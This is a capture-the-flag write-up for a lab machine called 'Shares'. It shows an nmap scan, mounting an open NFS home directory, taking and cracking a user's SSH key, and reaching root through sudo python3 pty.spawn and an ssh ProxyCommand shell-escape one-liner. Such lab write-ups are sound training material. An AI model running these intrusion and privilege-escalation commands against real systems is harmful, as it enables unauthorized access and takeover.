# Cybersec Labs- Shares

## NMAP

```
Nmap scan report for 172.31.1.7                                           
Host is up (0.23s latency).                                               
Not shown: 996 closed ports                                               
PORT     STATE SERVICE VERSION                                            
21/tcp   open  ftp     vsftpd 3.0.3                                       
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))                     
|_http-server-header: Apache/2.4.29 (Ubuntu)                              
|_http-title: Pet Shop                                                    
111/tcp  open  rpcbind 2-4 (RPC #100000)                                  
| rpcinfo:                                                                
|   program version    port/proto  service                                
|   100000  2,3,4        111/tcp   rpcbind                                
|   100000  2,3,4        111/udp   rpcbind                                
|   100000  3,4          111/tcp6  rpcbind                                
|   100000  3,4          111/udp6  rpcbind                                                                                                          
|   100003  3           2049/udp   nfs                                                                                                              
|   100003  3           2049/udp6  nfs                                    
|   100003  3,4         2049/tcp   nfs                                    
|   100003  3,4         2049/tcp6  nfs                                    
|   100005  1,2,3      33249/tcp   mountd                                 
|   100005  1,2,3      34467/tcp6  mountd                                 
|   100005  1,2,3      39042/udp6  mountd                                 
|   100005  1,2,3      41578/udp   mountd                                 
|   100021  1,3,4      37885/udp6  nlockmgr                               
|   100021  1,3,4      38607/tcp   nlockmgr                               
|   100021  1,3,4      43063/tcp6  nlockmgr                               
|   100021  1,3,4      51017/udp   nlockmgr                               
|   100227  3           2049/tcp   nfs_acl                                
|   100227  3           2049/tcp6  nfs_acl                                
|   100227  3           2049/udp   nfs_acl                                
|_  100227  3           2049/udp6  nfs_acl                                
2049/tcp open  nfs_acl 3 (RPC #100227)                                     
27853/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                       
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)                                                                                      
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)                                                                                     
|_  256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)                                                                                   
33249/tcp open  mountd   1-3 (RPC #100005)                                
38607/tcp open  nlockmgr 1-4 (RPC #100021)                                
49481/tcp open  mountd   1-3 (RPC #100005)                                
52729/tcp open  mountd   1-3 (RPC #100005)                                
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel           
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 1699.29 seconds             
```

## PORT 80

<img src="https://imgur.com/n71SA8a.png"/>

We see nothing on port 80

## PORT 2049 (NFS)

Now we can see which shares are avaiable for us to mount

`showmount -e 172.31.1.7` this gives us
```
Export list for 172.31.1.7:
/home/amir *.*.*.*
```
Now mounting it 
```
root@kali:~/Cybersec Labs/Easy/Shares# mkdir shares
root@kali:~/Cybersec Labs/Easy/Shares# mount 172.31.1.7:/home/amir shares/
root@kali:~/Cybersec Labs/Easy/Shares# ls
shares  Shares.md
root@kali:~/Cybersec Labs/Easy/Shares# cs shares/
-bash: cs: command not found
root@kali:~/Cybersec Labs/Easy/Shares# cd shares/
lroot@kali:~/Cybersec Labs/Easy/Shares/shares# ls -al
total 40
drwxrwxr-x 5 arz  arz  4096 Apr  2  2020 .
drwxr-xr-x 3 root root 4096 Nov  6 00:09 ..
-rw-r--r-- 1 arz  arz     0 Apr  2  2020 .bash_history
-rw-r--r-- 1 arz  arz   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 arz  arz  3786 Apr  2  2020 .bashrc
drw-r--r-- 2 arz  arz  4096 Apr  2  2020 .cache
drw-r--r-- 3 arz  arz  4096 Apr  2  2020 .gnupg
-rw-r--r-- 1 arz  arz   807 Apr  4  2018 .profile
drwxrwxr-x 2 arz  arz  4096 Apr  2  2020 .ssh
-rw-r--r-- 1 arz  arz     0 Apr  2  2020 .sudo_as_admin_successful
-rw-r--r-- 1 arz  arz  7713 Apr  2  2020 .viminfo
```
We see .ssh folder and we know that there is a port `27853` which is ruuning SSH

Copy  `id_rsa.pk` and rename it to `id_rsa` also change it's permissions to `600`

<img src="https://imgur.com/x9BRt7V.png"/>

We got the ssh key as we mounted `/home/amir` so username is `amir`


## PORT 27853 (SSH)

```
root@kali:~/Cybersec Labs/Easy/Shares# ssh amir@172.31.1.7 -i id_rsa -p 27853
load pubkey "id_rsa": invalid format
The authenticity of host '[172.31.1.7]:27853 ([172.31.1.7]:27853)' can't be established.
ECDSA key fingerprint is SHA256:dX2FJGyXzJVAvDXJL9rdhs2OdMiqVz12PvrXkSdH+T4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.31.1.7]:27853' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

```
But it's asking for passpharse for id_rsa

<img src="https://imgur.com/5lOVyHO.png"/>

<img src="https://imgur.com/5lOVyHO.png"/>

## Privilege Escalation

<img src="https://imgur.com/K0f2zXP.png"/>

We can run python3 as `amy` but not as `root`

so 

```
sudo -u amy /usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')";
```
This will give us a bash shell as `amy`


```
amy@shares:/home$ sudo -l
Matching Defaults entries for amy on shares:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amy may run the following commands on shares:
    (ALL) NOPASSWD: /usr/bin/ssh
amy@shares:/home$ 


```

https://gtfobins.github.io/gtfobins/ssh/

```
amy@shares:/home$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# bash
root@shares:/home# 
```
We are root !
